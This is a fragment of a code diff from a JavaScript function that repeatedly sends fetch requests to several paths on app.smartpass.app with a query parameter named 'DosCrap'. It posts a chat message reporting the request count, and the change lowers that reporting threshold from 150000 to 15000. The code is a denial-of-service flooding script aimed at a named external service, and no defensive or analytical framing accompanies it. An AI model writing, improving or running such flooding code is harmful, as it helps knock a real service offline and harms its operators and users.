@@ -13,7 +13,7 @@ async function fetchPasses() {
                 fetch("https://app.smartpass.app/balls2" + "?DosCrap=" + textt);
                 fetch("https://app.smartpass.app/balls3" + "?DosCrap=" + textt);
                 await fetch("https://app.smartpass.app/" + "?DosCrap=" + textt);
-                if (x>150000 && document.title == 'Gimcodes Chat'){
+                if (x>15000 && document.title == 'Gimcodes Chat'){
                     sendMessage('I have sent ' + x + ' requests to smartpass');
                     x = 0
                 }
